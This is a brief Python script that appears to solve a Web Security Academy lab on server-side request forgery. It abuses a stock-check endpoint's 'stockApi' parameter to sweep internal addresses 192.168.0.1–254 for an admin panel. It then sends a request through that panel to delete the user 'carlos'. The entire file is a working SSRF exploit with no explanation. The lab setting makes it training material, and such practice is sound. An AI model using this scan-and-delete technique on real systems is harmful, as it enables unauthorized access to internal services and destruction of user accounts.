# <FMI> (Fill Me In) denotes a value you will need to modify
import requests

stock_url = 'https://ace41f5f1e56ae0fc06829c6009300bd.web-security-academy.net/product/stock'
end_of_host = 0

for i in range(1, 255):
    ssrf_data = {
        'stockApi': f'http://192.168.0.{i}:8080/admin'
    }
    resp = requests.post(stock_url, data=ssrf_data)
    if resp.status_code == 200:
        end_of_host = i
        print(f'Admin interface at 192.168.0.{i}')
        break

stock_api_data = {
    'stockApi': f'http://192.168.0.{end_of_host}:8080/admin/delete?username=carlos'
}
print("TEST: ", stock_api_data)
resp = requests.post(stock_url, data=stock_api_data)
print(resp.text)
